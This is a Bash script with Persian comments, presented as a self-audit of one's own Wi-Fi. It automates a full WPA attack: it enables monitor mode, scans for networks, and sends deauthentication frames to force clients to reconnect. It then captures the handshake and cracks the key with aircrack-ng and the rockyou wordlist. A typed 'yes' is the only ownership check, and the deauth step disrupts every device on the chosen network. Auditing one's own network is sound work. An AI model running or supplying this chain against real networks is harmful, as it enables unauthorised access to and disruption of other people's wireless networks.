#!/usr/bin/env bash
#
# wifi-audit.sh — تست امنیت وای‌فایِ *خودت* (فقط شبکه‌ای که مالکش هستی)
# روی لپ‌تاپ/کالی لینوکس اجرا کن. به کارت وای‌فایِ سازگار با monitor mode نیاز دارد.
#
# استفاده:  sudo ./wifi-audit.sh
#
set -euo pipefail

# ---------- رنگ و لاگ ----------
R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"; N="\033[0m"
info(){ echo -e "${C}[*]${N} $*"; }
ok(){   echo -e "${G}[+]${N} $*"; }
warn(){ echo -e "${Y}[!]${N} $*"; }
err(){  echo -e "${R}[x]${N} $*" >&2; }

# ---------- ۰) هشدار قانونی ----------
clear
cat <<'BANNER'
==========================================================
   Wi-Fi Security Audit  —  فقط روی شبکهٔ خودت مجاز است
   تست شبکهٔ دیگران بدون اجازه جرم است.
==========================================================
BANNER
read -rp "تأیید می‌کنی که مالکِ این وای‌فای هستی؟ (yes/no) " AGREE
[[ "$AGREE" == "yes" ]] || { err "لغو شد."; exit 1; }

# ---------- ۱) root ----------
[[ $EUID -eq 0 ]] || { err "با sudo اجرا کن:  sudo $0"; exit 1; }

# ---------- ۲) نصب پیش‌نیازها ----------
info "بررسی/نصب پیش‌نیازها (aircrack-ng)..."
if ! command -v airmon-ng >/dev/null 2>&1; then
  if   command -v apt    >/dev/null 2>&1; then apt update -y && apt install -y aircrack-ng
  elif command -v pacman >/dev/null 2>&1; then pacman -Sy --noconfirm aircrack-ng
  elif command -v dnf    >/dev/null 2>&1; then dnf install -y aircrack-ng
  else err "پکیج‌منیجر ناشناخته؛ aircrack-ng را دستی نصب کن."; exit 1
  fi
fi
ok "aircrack-ng آماده است."

# ---------- ۳) انتخاب کارت وای‌فای ----------
info "کارت‌های وای‌فای موجود:"
mapfile -t IFACES < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
[[ ${#IFACES[@]} -gt 0 ]] || { err "هیچ کارت وای‌فایی پیدا نشد."; exit 1; }
select IFACE in "${IFACES[@]}"; do [[ -n "${IFACE:-}" ]] && break; done
ok "کارت انتخاب‌شده: $IFACE"

# ---------- ۴) monitor mode ----------
info "روشن‌کردن monitor mode..."
airmon-ng check kill >/dev/null 2>&1 || true
# نامِ کارت را قبل و بعد از airmon مقایسه می‌کنیم تا نامِ واقعیِ مانیتور را پیدا کنیم
BEFORE="$(iw dev | awk '/Interface/{print $2}' | sort)"
airmon-ng start "$IFACE" >/dev/null 2>&1 || true
sleep 2
AFTER="$(iw dev | awk '/Interface/{print $2}' | sort)"
# کارتی که تازه اضافه شده = مانیتور؛ اگر نامی عوض نشد، همان کارت monitor شده
MON="$(comm -13 <(echo "$BEFORE") <(echo "$AFTER") | head -1)"
[[ -z "$MON" ]] && MON="$IFACE"
# مطمئن شو واقعاً monitor است
if ! iw dev "$MON" info 2>/dev/null | grep -q "type monitor"; then
  ip link set "$MON" down 2>/dev/null || true
  iw dev "$MON" set type monitor 2>/dev/null || true
  ip link set "$MON" up 2>/dev/null || true
fi
iw dev "$MON" info 2>/dev/null | grep -q "type monitor" \
  && ok "مانیتور فعال شد: $MON" \
  || { err "monitor mode روی $MON فعال نشد؛ کارت پشتیبانی نمی‌کند."; exit 1; }

cleanup(){
  warn "بازگردانی کارت به حالت عادی و روشن‌کردن وای‌فای..."
  airmon-ng stop "$MON" >/dev/null 2>&1 || true
  # کارت را از monitor به managed برگردان
  ip link set "$MON" down 2>/dev/null || true
  iw dev "$MON" set type managed 2>/dev/null || true
  ip link set "$MON" up 2>/dev/null || true
  # هر سرویسِ شبکه‌ای که موجود بود را ری‌استارت کن (بی‌سروصدا)
  systemctl restart NetworkManager 2>/dev/null \
    || service network-manager restart 2>/dev/null \
    || systemctl restart wpa_supplicant 2>/dev/null || true
  nmcli radio wifi on 2>/dev/null || true
  ok "تمام شد. اگر وای‌فای وصل نشد، فقط لپ‌تاپ را reboot کن."
}
trap cleanup EXIT

# ---------- ۵) اسکن شبکه‌ها ----------
WORK="$(mktemp -d)"; cd "$WORK"
info "اسکن شبکه‌ها (~۱۵ ثانیه)... صبر کن، خودش تمام می‌شود و لیست می‌آید."
# airodump را در پس‌زمینه اجرا می‌کنیم و با SIGINT (نه SIGTERM) تمیز می‌بندیم
# تا csv را کامل بنویسد. این مطمئن‌تر از timeout است.
airodump-ng --output-format csv -w scan "$MON" >/dev/null 2>&1 &
SCAN=$!
sleep 15
kill -INT "$SCAN" 2>/dev/null || true
sleep 2
kill -9 "$SCAN" 2>/dev/null || true   # اگر بازنشد، قطعی می‌کشیم
echo
info "شبکه‌های پیداشده:"
CSV="$(ls -t scan-*.csv 2>/dev/null | head -1)"
[[ -n "$CSV" ]] || { err "اسکن خروجی نداد؛ monitor mode یا کارت مشکل دارد."; exit 1; }
awk -F',' 'NF>13 && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
  gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4); gsub(/^ +| +$/,"",$14);
  printf "%2d) SSID:%-25s BSSID:%s  CH:%s\n", ++i, $14, $1, $4}' "$CSV" | tee nets.txt
[[ -s nets.txt ]] || { err "شبکه‌ای پیدا نشد. کارت را چند ثانیه بعد دوباره امتحان کن."; exit 1; }

read -rp "BSSID وای‌فای خودت را کپی کن: " BSSID
read -rp "کانالش (CH): " CH

# ---------- ۶) گرفتن handshake ----------
info "گوش‌دادن برای handshake روی $BSSID (کانال $CH)..."
airodump-ng -c "$CH" --bssid "$BSSID" -w cap "$MON" >/dev/null 2>&1 &
DUMP=$!
sleep 3
info "ارسال deauth برای وادارکردن دستگاه‌ها به اتصال دوباره..."
aireplay-ng --deauth 10 -a "$BSSID" "$MON" >/dev/null 2>&1 || true
info "۳۰ ثانیه صبر برای ثبت handshake..."
sleep 30
kill "$DUMP" 2>/dev/null || true

if aircrack-ng cap-01.cap 2>/dev/null | grep -q "1 handshake"; then
  ok "handshake ثبت شد."
else
  warn "handshake ثبت نشد. دوباره اجرا کن یا یک دستگاه را دستی وصل/قطع کن."
  exit 1
fi

# ---------- ۷) تست پسورد با wordlist ----------
WL="${1:-/usr/share/wordlists/rockyou.txt}"
if [[ ! -f "$WL" ]]; then
  warn "wordlist پیدا نشد: $WL"
  read -rp "مسیر یک wordlist بده: " WL
fi
[[ -f "$WL" ]] || { err "wordlist نامعتبر."; exit 1; }

info "تست پسورد با $WL ..."
aircrack-ng -w "$WL" -b "$BSSID" cap-01.cap | tee result.txt

if grep -q "KEY FOUND" result.txt; then
  err "پسوردت شکسته شد → ضعیف است، عوضش کن!"
else
  ok "پسورد در این wordlist پیدا نشد → نسبتاً مقاوم."
fi

echo
info "فایل‌های خروجی در: $WORK"
